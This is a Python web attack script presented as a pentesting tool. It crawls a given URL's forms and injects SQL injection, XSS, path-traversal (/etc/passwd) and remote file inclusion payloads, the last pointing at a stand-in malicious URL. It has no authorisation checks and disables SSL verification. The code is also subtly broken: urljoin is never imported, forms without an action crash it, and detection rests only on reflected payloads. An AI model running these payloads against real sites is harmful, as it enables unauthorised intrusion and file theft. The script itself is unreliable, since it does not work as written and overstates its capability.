import requests
from bs4 import BeautifulSoup
import concurrent.futures
import argparse
import logging

# Configure Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

# Arguments Parsing
parser = argparse.ArgumentParser(description='AutoBahn Advanced Pentesting Tool')
parser.add_argument('-u', '--url', help='Target URL', required=True)
args = parser.parse_args()

# Global Variables
HEADERS = {'User-Agent': 'AutoBahn Pentest Bot'}
VERIFY_SSL = False
TIMEOUT = 5
TEST_PAYLOADS = {
    'sqli': ["'", '"', ' OR 1=1', ' OR 1=1--'],
    'xss': ['<script>alert(1);</script>', '" onmouseover="alert(1)"', "' onmouseover='alert(1)'"],
    'lfi': ['../../etc/passwd', '....//....//etc/passwd', '/etc/passwd%00', '....//....//etc/passwd%00'],
    'rfi': ['http://example.com/malicious.txt', 'https://example.com/malicious.txt']
}

# Utility Functions
def request_url(url):
    try:
        return requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=VERIFY_SSL), None
    except requests.RequestException as e:
        return None, e

def find_forms(soup):
    return soup.find_all('form')

def form_details(form):
    details = {}
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append((input_type, input_name))
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input_type, input_name in inputs:
        if input_type == "text" or input_type == "search":
            data[input_name] = payload
    if form_details["method"] == "post":
        return requests.post(target_url, data=data, headers=HEADERS), None
    else:
        return requests.get(target_url, params=data, headers=HEADERS), None

def test_payload(url, payload_type):
    response, error = request_url(url)
    if error:
        logger.error(f"Error with {url}: {error}")
        return

    # Check if it's a form
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = find_forms(soup)
    for form in forms:
        form_details_info = form_details(form)
        for payload in TEST_PAYLOADS[payload_type]:
            response, error = submit_form(form_details_info, url, payload)
            if error:
                logger.error(f"Error submitting form: {error}")
                continue
            if payload in response.text:
                logger.warning(f"Potential {payload_type.upper()} vulnerability in form action {form_details_info['action']} submitting {payload}")

# Main Function
def main(target_url):
    logger.info(f"Starting advanced pentesting with AutoBahn at {target_url}")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        # SQLi
        executor.submit(test_payload, target_url, 'sqli')
        # XSS
        executor.submit(test_payload, target_url, 'xss')
        # LFI
        executor.submit(test_payload, target_url, 'lfi')
        # RFI
        executor.submit(test_payload, target_url, 'rfi')

if __name__ == "__main__":
    main(args.url)
